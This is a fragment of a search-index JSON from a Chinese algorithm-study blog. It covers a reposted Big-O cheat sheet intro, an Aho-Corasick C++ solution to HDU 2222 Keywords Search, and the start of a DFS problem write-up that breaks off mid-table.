Algorithms","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#1","text":"\u6700\u8fd1\u770b\u5230\u4e00\u7bc7\u603b\u7ed3\u7b97\u6cd5\u590d\u6742\u5ea6\u7684\u535a\u5ba2\uff0c\u539f\u4f5c\u8005Eric\u662f\u4e3a\u4e86\u9762\u8bd5\u65b9\u4fbf\u800c\u603b\u7ed3\u51fa\u4e86\u4e00\u4efd\u7b97\u6cd5\u590d\u6742\u5ea6\u901f\u67e5\u8868\uff0c\u5728\u6b64\u8f6c\u8f7d\u4e00\u4e0b\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.bigocheatsheet.com Hi there! This webpage covers the space and time Big-O complexities of common algorithms used in Computer Science. When preparing for technical interviews in the past, I found myself spending hours crawling the internet putting together the best, average, and worst case complexities for search and sorting algorithms so that I wouldn't be stumped when asked about them. Over the last few years, I've interviewed at several Silicon Valley startups, and also some bigger companies, like Google, Facebook, Yahoo, LinkedIn, and Uber, and each time that I prepared for an interview, I thought to myself \"Why hasn't someone created a nice Big-O cheat sheet?\". So, to save all of you fine folks a ton of time, I went ahead and created one. Enjoy! - Eric","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#2-big-o-complexity-chart","text":"\\text{Figure 1. Big-O Complexity Chart}","title":"2. Big-O Complexity Chart"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#3-common-data-structure-operations","text":"\\text{Figure 2. Common Data Structure Operations}","title":"3. Common Data Structure Operations"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/3.%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E9%80%9F%E6%9F%A5%E8%A1%A8/#4-array-sorting-algorithms","text":"\\text{Figure 3. Array Sorting Algorithms}","title":"4. Array Sorting Algorithms"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/","text":"HDU 2222 Keywords Search # \u76ee\u5f55 # HDU 2222 Keywords Search \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 131072/131072 K (Java/Others) 1.2. Problem Description # In the modern time, Search engine came into the life of everybody like Google, Baidu, etc. Wiskey also wants to bring this feature to his image retrieval system. Every image have a long description, when users type some keywords to find the image, the system will match the keywords with description of image and show the image which the most keywords be matched. To simplify the problem, giving you a description of image, and some keywords, you should tell me how many keywords will be match. 1.3. Input # First line will contain one integer means how many cases will follow by. Each case will contain two integers N means the number of keywords and N keywords follow. (N \\le 10000) Each keyword will only contains characters 'a'-'z', and the length will be not longer than 50 . The last line is the description, and the length will be not longer than 1000000 . 1.4. Output # Print how many keywords are contained in the description. 1.5. Sample Input # 1 5 she he say shr her yasherhs 1.6. Sample Output # 3 1.7. Source # HDU 2222 Keywords Search 2. \u89e3\u8bfb # AC\u81ea\u52a8\u673a (Aho-Corasick automaton) \u7684\u6a21\u677f\u9898\u3002 AC\u81ea\u52a8\u673a \u4f7f\u7528\u4e86 Trie\u6811 \u7684\u7ed3\u6784\u548c KMP\u7b97\u6cd5 \u7684\u601d\u60f3\uff0c\u5c06\u6240\u6709\u6a21\u5f0f\u4e32 P \u7528 Trie\u6811 \u8fdb\u884c\u5b58\u50a8\uff0c\u5e76\u4e14\u5bf9\u6bcf\u4e2a\u8282\u70b9\uff0c\u6784\u9020 Fail\u6570\u7ec4 \uff0c\u8fd9\u4e2a Fail\u6570\u7ec4 \u548c KMP\u7b97\u6cd5 \u4e2d\u7684 Next\u6570\u7ec4 \u6709\u4e9b\u7c7b\u4f3c\uff0c\u4f46\u4e0d\u5b8c\u5168\u4e00\u6837\u3002 Fail[x + i] = k \u5176\u4e2d x \u8868\u793a\u6a21\u5f0f\u4e32 \\alpha \u5728 Trie\u6811 \u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c i \u8868\u793a\u6211\u4eec\u5224\u65ad\u7684\u662f\u5f53\u524d\u6a21\u5f0f\u4e32\u5206\u652f \\alpha \u7684\u7b2c i \u4e2a\u8282\u70b9\uff0c k \u8868\u793a \\alpha \u4e2d\u4ee5 i \u4e3a\u7ec8\u70b9\u7684\u6700\u957f\u540e\u7f00\u4e0e Trie\u6811 \u4e2d\u7684\u7b2c k \u4e2a\u4f4d\u7f6e\u5bf9\u5e94\u7684\u6a21\u5f0f\u4e32 \\beta \u7684\u524d\u7f00\u76f8\u5339\u914d\u3002 \\alpha[i-len:i + 1] = \\beta[0:len + 1] max(len) [a:b] \u4e3a\u5de6\u95ed\u53f3\u5f00\u533a\u95f4\uff0c len + 1 \u4e3a\u540e\u7f00\u7684\u957f\u5ea6\uff0c max(len) \u8868\u793a\u6211\u4eec\u8981\u627e\u7684\u662f\u6700\u957f\u5339\u914d\u540e\u7f00\u3002 \u4f7f\u7528\u4ee5\u4e0b\u8f93\u5165\u4e3a\u4f8b 1 5 she he say shr her yasherhs \u9996\u5148\u6784\u5efa Trie\u6811 \uff0c\u5982 \u56fe1 \u3002\u6bcf\u4e2a\u8282\u70b9\u5de6\u8fb9\u7684\u6570\u5b57\u4e3a\u8282\u70b9\u5e8f\u53f7\uff0c\u53f3\u8fb9\u4e3a\u8282\u70b9\u5b58\u50a8\u7684\u5b57\u7b26\u3002 \\text{Figure 1. Trie\u6811} \u7136\u540e\u901a\u8fc7 DFS \u83b7\u53d6 Fail \u6570\u7ec4\uff0c\u6807\u53f7\u4e3a 1-2 \u7684\u5b50\u4e32 sh \uff0c\u5176\u540e\u7f00 h \u4e0e\u6807\u53f7\u4e3a 4 \u7684\u524d\u7f00\u76f8\u5339\u914d\uff1b\u6807\u53f7\u4e3a 1-3 \u7684\u5b50\u4e32 she \uff0c\u5176\u540e\u7f00 he \u4e0e\u6807\u53f7\u4e3a 4-5 \u7684\u524d\u7f00\u76f8\u5339\u914d\u3002 Fail[2] = 4, Fail[3] = 5 Fail \u6570\u7ec4\u4e2d\u7684\u5176\u4ed6\u6210\u5458\u90fd\u6307\u5411\u6839\u7ed3\u70b9\uff0c\u5373 Fail[x_i] = 0 \u3002 \u5728\u4ee3\u7801\u4e2d\u52a0\u5165\u8f93\u51fa\u8bed\u53e5\uff0c\u53ef\u4ee5\u770b\u5230 DFS \u6784\u5efa Fail \u6570\u7ec4\u7684\u5177\u4f53\u8fc7\u7a0b\u3002 front: 4 char: e fail: 0 front: 1 char: a fail: 0 char: h fail: 4 front: 5 char: r fail: 0 front: 6 char: y fail: 0 front: 2 char: e fail: 5 char: r fail: 0 front: 9 front: 7 front: 3 front: 8 3. \u4ee3\u7801 # #include <iostream> #include <queue> #include <string.h> using namespace std; const int maxN = 5e5 + 1; // \u6a21\u5f0f\u4e32\u957f\u5ea6 * \u6a21\u5f0f\u4e32\u6570\u91cf const int maxM = 1e6 + 1; // \u76ee\u6807\u4e32\u957f\u5ea6 const int chSize = 26; // \u5b57\u7b26\u96c6\u5927\u5c0f class AcAutomaton { public: int trie[maxN][chSize]; int vis[maxN], fail[maxN]; int tot; // \u521d\u59cb\u5316 void init() { memset(vis, 0, sizeof vis); memset(trie, 0, sizeof trie); tot = 0; } // \u63d2\u5165 void insert(char* str) { int len = strlen(str); int pos = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; if (!trie[pos][c]) trie[pos][c] = ++tot; pos = trie[pos][c]; } vis[pos]++; } // DFS\u83b7\u53d6Fail\u6570\u7ec4 void build() { queue<int> q; // \u6839\u7ed3\u70b9\u4e0b\u7684\u5143\u7d20\u5165\u961f for (int i = 0; i < chSize; i++) { if (trie[0][i]) { fail[trie[0][i]] = 0; q.push(trie[0][i]); } } // DFS while (!q.empty()) { // \u83b7\u53d6\u961f\u9996\u5143\u7d20 int pos = q.front(); // \u8f93\u51fa\u961f\u9996\u5143\u7d20 // cout << \"front: \" << pos << endl; // \u961f\u9996\u51fa\u961f q.pop(); // \u904d\u5386\u961f\u9996\u5143\u7d20\u7684\u5b50\u8282\u70b9 for (int i = 0; i < chSize; i++) { // \u82e5\u5143\u7d20ch\u5b58\u5728 if (trie[pos][i]) { // \u5c06fail\u6570\u7ec4\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c fail[trie[pos][i]] = trie[fail[pos]][i]; // \u8f93\u51fa\u6784\u5efafail\u6570\u7ec4\u7684\u8fc7\u7a0b // cout << \"True char: \" << (char)('a' + i) << \" fail: \" << trie[fail[pos]][i] << endl; // \u5143\u7d20\u5165\u961f q.push(trie[pos][i]); } else { // \u82e5\u4e0d\u5b58\u5728\uff0c\u5c06trie\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c // \u65b9\u4fbf\u4e0b\u6b21\u8ba1\u7b97 trie[pos][i] = trie[fail[pos]][i]; } } } } // \u67e5\u8be2 int query(char* str) { int len = strlen(str); int pos = 0, ans = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; pos = trie[pos][c]; for (int j = pos; j && vis[j] != -1; j = fail[j]) { ans += vis[j]; vis[j] = -1; } } return ans; } }; AcAutomaton ac; int main() { int t; scanf(\"%d\", &t); while (t--) { ac.init(); char str[maxM]; int n; scanf(\"%d\", &n); for (int i = 0; i < n; i++) { scanf(\"%s\", str); ac.insert(str); } ac.build(); scanf(\"%s\", str); printf(\"%d\\n\", ac.query(str)); } } \u6ce8\uff1a\u4ee3\u7801\u53c2\u8003\u81ea\u54c8\u5c14\u6ee8\u7406\u5de5\u5927\u5b66ACM-ICPC\u96c6\u8bad\u961f\u5e38\u7528\u4ee3\u7801\u5e93 \u94fe\u63a5\uff1a https://pan.baidu.com/s/1eJwyrqCDQOAlPWC1mbPRKQ \u5bc6\u7801\uff1agv5k \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.HDU 2222 Keywords Search"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#hdu-2222-keywords-search","text":"","title":"HDU 2222 Keywords Search"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#_1","text":"HDU 2222 Keywords Search \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#11-limit","text":"Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 131072/131072 K (Java/Others)","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#12-problem-description","text":"In the modern time, Search engine came into the life of everybody like Google, Baidu, etc. Wiskey also wants to bring this feature to his image retrieval system. Every image have a long description, when users type some keywords to find the image, the system will match the keywords with description of image and show the image which the most keywords be matched. To simplify the problem, giving you a description of image, and some keywords, you should tell me how many keywords will be match.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#13-input","text":"First line will contain one integer means how many cases will follow by. Each case will contain two integers N means the number of keywords and N keywords follow. (N \\le 10000) Each keyword will only contains characters 'a'-'z', and the length will be not longer than 50 . The last line is the description, and the length will be not longer than 1000000 .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#14-output","text":"Print how many keywords are contained in the description.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#15-sample-input","text":"1 5 she he say shr her yasherhs","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#16-sample-output","text":"3","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#17-source","text":"HDU 2222 Keywords Search","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#2","text":"AC\u81ea\u52a8\u673a (Aho-Corasick automaton) \u7684\u6a21\u677f\u9898\u3002 AC\u81ea\u52a8\u673a \u4f7f\u7528\u4e86 Trie\u6811 \u7684\u7ed3\u6784\u548c KMP\u7b97\u6cd5 \u7684\u601d\u60f3\uff0c\u5c06\u6240\u6709\u6a21\u5f0f\u4e32 P \u7528 Trie\u6811 \u8fdb\u884c\u5b58\u50a8\uff0c\u5e76\u4e14\u5bf9\u6bcf\u4e2a\u8282\u70b9\uff0c\u6784\u9020 Fail\u6570\u7ec4 \uff0c\u8fd9\u4e2a Fail\u6570\u7ec4 \u548c KMP\u7b97\u6cd5 \u4e2d\u7684 Next\u6570\u7ec4 \u6709\u4e9b\u7c7b\u4f3c\uff0c\u4f46\u4e0d\u5b8c\u5168\u4e00\u6837\u3002 Fail[x + i] = k \u5176\u4e2d x \u8868\u793a\u6a21\u5f0f\u4e32 \\alpha \u5728 Trie\u6811 \u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c i \u8868\u793a\u6211\u4eec\u5224\u65ad\u7684\u662f\u5f53\u524d\u6a21\u5f0f\u4e32\u5206\u652f \\alpha \u7684\u7b2c i \u4e2a\u8282\u70b9\uff0c k \u8868\u793a \\alpha \u4e2d\u4ee5 i \u4e3a\u7ec8\u70b9\u7684\u6700\u957f\u540e\u7f00\u4e0e Trie\u6811 \u4e2d\u7684\u7b2c k \u4e2a\u4f4d\u7f6e\u5bf9\u5e94\u7684\u6a21\u5f0f\u4e32 \\beta \u7684\u524d\u7f00\u76f8\u5339\u914d\u3002 \\alpha[i-len:i + 1] = \\beta[0:len + 1] max(len) [a:b] \u4e3a\u5de6\u95ed\u53f3\u5f00\u533a\u95f4\uff0c len + 1 \u4e3a\u540e\u7f00\u7684\u957f\u5ea6\uff0c max(len) \u8868\u793a\u6211\u4eec\u8981\u627e\u7684\u662f\u6700\u957f\u5339\u914d\u540e\u7f00\u3002 \u4f7f\u7528\u4ee5\u4e0b\u8f93\u5165\u4e3a\u4f8b 1 5 she he say shr her yasherhs \u9996\u5148\u6784\u5efa Trie\u6811 \uff0c\u5982 \u56fe1 \u3002\u6bcf\u4e2a\u8282\u70b9\u5de6\u8fb9\u7684\u6570\u5b57\u4e3a\u8282\u70b9\u5e8f\u53f7\uff0c\u53f3\u8fb9\u4e3a\u8282\u70b9\u5b58\u50a8\u7684\u5b57\u7b26\u3002 \\text{Figure 1. Trie\u6811} \u7136\u540e\u901a\u8fc7 DFS \u83b7\u53d6 Fail \u6570\u7ec4\uff0c\u6807\u53f7\u4e3a 1-2 \u7684\u5b50\u4e32 sh \uff0c\u5176\u540e\u7f00 h \u4e0e\u6807\u53f7\u4e3a 4 \u7684\u524d\u7f00\u76f8\u5339\u914d\uff1b\u6807\u53f7\u4e3a 1-3 \u7684\u5b50\u4e32 she \uff0c\u5176\u540e\u7f00 he \u4e0e\u6807\u53f7\u4e3a 4-5 \u7684\u524d\u7f00\u76f8\u5339\u914d\u3002 Fail[2] = 4, Fail[3] = 5 Fail \u6570\u7ec4\u4e2d\u7684\u5176\u4ed6\u6210\u5458\u90fd\u6307\u5411\u6839\u7ed3\u70b9\uff0c\u5373 Fail[x_i] = 0 \u3002 \u5728\u4ee3\u7801\u4e2d\u52a0\u5165\u8f93\u51fa\u8bed\u53e5\uff0c\u53ef\u4ee5\u770b\u5230 DFS \u6784\u5efa Fail \u6570\u7ec4\u7684\u5177\u4f53\u8fc7\u7a0b\u3002 front: 4 char: e fail: 0 front: 1 char: a fail: 0 char: h fail: 4 front: 5 char: r fail: 0 front: 6 char: y fail: 0 front: 2 char: e fail: 5 char: r fail: 0 front: 9 front: 7 front: 3 front: 8","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/1.HDU_2222_Keywords_Search/#3","text":"#include <iostream> #include <queue> #include <string.h> using namespace std; const int maxN = 5e5 + 1; // \u6a21\u5f0f\u4e32\u957f\u5ea6 * \u6a21\u5f0f\u4e32\u6570\u91cf const int maxM = 1e6 + 1; // \u76ee\u6807\u4e32\u957f\u5ea6 const int chSize = 26; // \u5b57\u7b26\u96c6\u5927\u5c0f class AcAutomaton { public: int trie[maxN][chSize]; int vis[maxN], fail[maxN]; int tot; // \u521d\u59cb\u5316 void init() { memset(vis, 0, sizeof vis); memset(trie, 0, sizeof trie); tot = 0; } // \u63d2\u5165 void insert(char* str) { int len = strlen(str); int pos = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; if (!trie[pos][c]) trie[pos][c] = ++tot; pos = trie[pos][c]; } vis[pos]++; } // DFS\u83b7\u53d6Fail\u6570\u7ec4 void build() { queue<int> q; // \u6839\u7ed3\u70b9\u4e0b\u7684\u5143\u7d20\u5165\u961f for (int i = 0; i < chSize; i++) { if (trie[0][i]) { fail[trie[0][i]] = 0; q.push(trie[0][i]); } } // DFS while (!q.empty()) { // \u83b7\u53d6\u961f\u9996\u5143\u7d20 int pos = q.front(); // \u8f93\u51fa\u961f\u9996\u5143\u7d20 // cout << \"front: \" << pos << endl; // \u961f\u9996\u51fa\u961f q.pop(); // \u904d\u5386\u961f\u9996\u5143\u7d20\u7684\u5b50\u8282\u70b9 for (int i = 0; i < chSize; i++) { // \u82e5\u5143\u7d20ch\u5b58\u5728 if (trie[pos][i]) { // \u5c06fail\u6570\u7ec4\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c fail[trie[pos][i]] = trie[fail[pos]][i]; // \u8f93\u51fa\u6784\u5efafail\u6570\u7ec4\u7684\u8fc7\u7a0b // cout << \"True char: \" << (char)('a' + i) << \" fail: \" << trie[fail[pos]][i] << endl; // \u5143\u7d20\u5165\u961f q.push(trie[pos][i]); } else { // \u82e5\u4e0d\u5b58\u5728\uff0c\u5c06trie\u7684\u503c\u7f6e\u4e3afail[\u961f\u9996\u5143\u7d20]\u7684\u4e0b\u4e00\u4e2ach\u5bf9\u5e94\u7684\u503c // \u65b9\u4fbf\u4e0b\u6b21\u8ba1\u7b97 trie[pos][i] = trie[fail[pos]][i]; } } } } // \u67e5\u8be2 int query(char* str) { int len = strlen(str); int pos = 0, ans = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; pos = trie[pos][c]; for (int j = pos; j && vis[j] != -1; j = fail[j]) { ans += vis[j]; vis[j] = -1; } } return ans; } }; AcAutomaton ac; int main() { int t; scanf(\"%d\", &t); while (t--) { ac.init(); char str[maxM]; int n; scanf(\"%d\", &n); for (int i = 0; i < n; i++) { scanf(\"%s\", str); ac.insert(str); } ac.build(); scanf(\"%s\", str); printf(\"%d\\n\", ac.query(str)); } } \u6ce8\uff1a\u4ee3\u7801\u53c2\u8003\u81ea\u54c8\u5c14\u6ee8\u7406\u5de5\u5927\u5b66ACM-ICPC\u96c6\u8bad\u961f\u5e38\u7528\u4ee3\u7801\u5e93 \u94fe\u63a5\uff1a https://pan.baidu.com/s/1eJwyrqCDQOAlPWC1mbPRKQ \u5bc6\u7801\uff1agv5k \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14132_%E8%B4%9D%E4%BC%A6%E5%8D%A1%E6%96%AF%E6%B3%B0%E9%9C%B2/","text":"\u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8d1d\u4f26\u5361\u65af\u6cf0\u9732\uff0c\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u4e5f\u53ef\u4ee5\u79f0\u4e3a\u53e4\u624b\u68a8\u82b1\uff0c\u80fd\u591f\u521b\u9020\u51e0\u7387\u8fd1\u4e4e\u4e3a0\u7684\u5947\u8ff9\uff0c\u901a\u8fc7\u65e0\u9650\u8f6e\u56de\u6210\u529f\u6253\u7834\u4e86\u4e16\u754c\u7ebf\u6536\u675f\u7406\u8bba\u3002\u548c\u67d0\u79d1\u5b66\u8005\u4e0d\u540c\uff0c\u8d1d\u4f26\u5e76\u4e0d\u5728\u610f\u4e16\u754c\u7ebf\u6536\u675f\u7684\u90a3\u5957\u7406\u8bba\uff0c\u4f5c\u4e3a\u5947\u8ff9\u4e4b\u9b54\u5973\uff0c\u8d1d\u4f26\u7684\u7231\u597d\u53ea\u5728\u4e8e\u54c1\u8336\u3002\u4f5c\u4e3a\u54c1\u8336\u7684\u6d88\u9063\uff0c\u8d1d\u4f26\u6b63\u5728\u89e3\u4e00\u9053\u7b80\u5355\u7684\u8c1c\u9898\u3002 \u7ed9\u51fa\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u6570\u5217 A_i \uff0c\u95ee\u662f\u5426\u80fd\u5c06\u8fd9\u4e2a\u6570\u5217\u5206\u89e3\u4e3a\u4e24\u4e2a\u957f\u5ea6\u4e3a n/2 \u7684\u5b50\u5e8f\u5217\uff0c\u6ee1\u8db3 \u4e24\u4e2a\u5b50\u5e8f\u5217\u4e0d\u4e92\u76f8\u91cd\u53e0\u3002 \u4e24\u4e2a\u5b50\u5e8f\u5217\u4e2d\u7684\u6570\u8981\u5b8c\u5168\u4e00\u6837\uff0c \\{1, 2\\} = \\{1, 2\\} \uff0c \\{1, 2\\} \\ne \\{2, 1\\} \u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 T \uff0c\u8868\u793a\u6570\u636e\u7ec4\u6570\u3002 \u63a5\u4e0b\u6765 T \u7ec4\u6570\u636e\uff0c\u6bcf\u7ec4\u6570\u636e\u7684\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n \uff0c\u7b2c\u4e8c\u884c n \u4e2a\u6b63\u6574\u6570 A_i \u3002 1.4. Output # \u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u884c\uff0c\u5982\u679c\u53ef\u4ee5\u5b8c\u6210\uff0c\u8f93\u51faFrederica Bernkastel\uff0c\u5426\u5219\u8f93\u51faFurude Rika\u3002 1.5. Sample Input # 3 4 1 1 2 2 6 1 2 3 4 5 6 4 1 2 2 1 1.6. Sample Output # Frederica Bernkastel Furude Rika Furude Rika 1.7. Source # \u725b\u5ba2\u7f51 NC14132 \u8d1d\u4f26\u5361\u65af\u6cf0\u9732 2. \u89e3\u8bfb # DFS \u7ef4\u62a4\u4e24\u4e2a\u6570\u7ec4 listA \u548c listB \uff0c \u5728\u6bcf\u9047\u5230\u4e00\u4e2a\u5339\u914d\u7684\u5143\u7d20 A_i \u65f6\uff0c\u4f1a\u8fdb\u5165\u5206\u5c94\u70b9\uff0c\u5982\u679c\u8be5\u5143\u7d20 A_i \u8fdb\u5165\u961f\u5217 listB \u540e\u80fd\u591f\u641c\u7d22\u5b8c\u5168\u90e8\u5143\u7d20\uff0c\u5219\u641c\u7d22\u5b8c\u6210\u3002 \u5982\u679c listA \u4e2d\u7684\u5143\u7d20\u6570\u5217\u8d85\u8fc7\u6240\u6709\u5143\u7d20\u6570\u5217 n \u7684\u4e00\u534a\uff0c\u5373 listA.size() > n / 2 \uff0c\u5219\u56de\u9000\u5230\u4e0a\u4e00\u6b65\uff0c\u8ba9\u5143\u7d20\u8fdb\u5165 listB \u3002 \u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u5373\u80fd\u904d\u5386\u6240\u6709\u60c5\u51b5\u3002 \u6bd4\u5982\u5982\u4e0b\u6d4b\u8bd5\u7528\u4f8b\u3002 1 6 1 1 2 1 1 2 Table 1. \\text{\u8ba1\u7b97\u8fc7\u7a0b\u8868} | \u5e8f\u53f7 | listA | listB | \u5165\u961f\u5143\u7d20 | \u5907\u6ce8 | | :---: | :-----: | :-----: | :------: | :----------: | | 1 | 1 | null | 1 | \u521d\u59cb\u5316 | | 2 | 1 | 1 | 1 | \u5165\u961f B | | 3 | 1 2 | 1 | 2 | \u5165\u961f A | | 4 | 1 2 1 | 1 | 1 | \u5165\u961f A | | 5 | 1 2 1 1 | 1 | 1 | \u961fA\u5143\u7d204 > 3 | | 6 | 1 | null | | \u56de\u9000 | | 7 | 1 1 | null | 1 | \u5165\u961f A | 